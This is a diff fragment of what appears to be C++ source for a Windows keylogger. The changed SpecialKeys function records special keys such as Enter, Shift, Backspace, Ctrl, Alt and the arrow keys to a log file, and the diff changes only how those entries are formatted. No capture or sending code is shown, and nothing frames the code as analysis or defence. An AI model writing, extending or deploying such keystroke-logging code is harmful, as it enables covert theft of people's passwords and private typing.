@@ -50,7 +50,7 @@ bool SpecialKeys(int S_Key) {
 		return true;
 	case VK_RETURN:
 		cout << "\n";
-		LOG("Enter");
+		LOG("\nEnter\n");
 		return true;
 	case '¾':
 		cout << ".";
@@ -58,11 +58,11 @@ bool SpecialKeys(int S_Key) {
 		return true;
 	case VK_SHIFT:
 		cout << "#SHIFT#";
-		LOG("SHIFT");
+		LOG("\nSHIFT\n");
 		return true;
 	case VK_BACK:
 		cout << "\b";
-		LOG("BACKSPACE");
+		LOG("\nBACKSPACE\n");
 		return true;
 	case VK_RBUTTON:
 		cout << "#R_CLICK#";
@@ -70,47 +70,47 @@ bool SpecialKeys(int S_Key) {
 		return true;
 	case VK_CAPITAL:
 		cout << "#CAPS_LOCK#";
-		LOG("CAPS_LOCK");
+		LOG("\nCAPS_LOCK\n");
 		return true;
 	case VK_TAB:
 		cout << "#TAB";
-		LOG("TAB");
+		LOG("\nTAB\n");
 		return true;
 	case VK_UP:
 		cout << "#UP";
-		LOG("UP_ARROW_KEY");
+		LOG("\nUP_ARROW_KEY\n");
 		return true;
 	case VK_DOWN:
 		cout << "#DOWN";
-		LOG("DOWN_ARROW_KEY");
+		LOG("\nDOWN_ARROW_KEY\n");
 		return true;
 	case VK_LEFT:
 		cout << "#LEFT";
-		LOG("LEFT_ARROW_KEY");
+		LOG("\nLEFT_ARROW_KEY\n");
 		return true;
 	case VK_RIGHT:
 		cout << "#RIGHT";
-		LOG("RIGHT_ARROW_KEY");
+		LOG("\nRIGHT_ARROW_KEY\n");
 		return true;
 	case VK_CONTROL:
 		cout << "#CONTROL";
-		LOG("CTRL");
+		LOG("\nCTRL\n");
 		return true;
 	case VK_MENU:
 		cout << "#ALT";
-		LOG("ALT");
+		LOG("\nALT\n");
 		return true;
     case VK_LWIN:
         cout << "#LEFT WIN";
-        LOG("LEFT WIN");
+        LOG("\nLEFT WIN\n");
         return true;
     case VK_RWIN:
         cout << "#RIGHT WIN";
-        LOG("RIGHT WIN");
+        LOG("\nRIGHT WIN\n");
         return true;
     case VK_APPS:
         cout << "#APP/FN";
-        LOG("APP/FN");
+        LOG("\nAPP/FN\n");
         return true;
 	default:
 		return false;
@@ -148,7 +148,7 @@ int main()
 					}
 
 				}
-				LOG("\n");
+//				LOG("\n");
 				break;
 			}
         }
